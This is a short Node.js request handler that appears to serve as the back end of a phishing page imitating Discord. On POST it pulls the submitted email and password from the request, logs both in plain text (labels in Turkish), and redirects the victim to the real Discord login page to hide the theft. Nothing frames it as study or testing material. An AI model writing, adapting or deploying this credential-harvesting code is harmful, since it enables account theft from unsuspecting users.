module.exports = async function handler(req, res) {
  if (req.method === 'POST') {
    const { email, password } = req.body;
    console.log(`E-posta: ${email}, Sifre: ${password}`);
    res.redirect(302, 'https://discord.com/login');
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}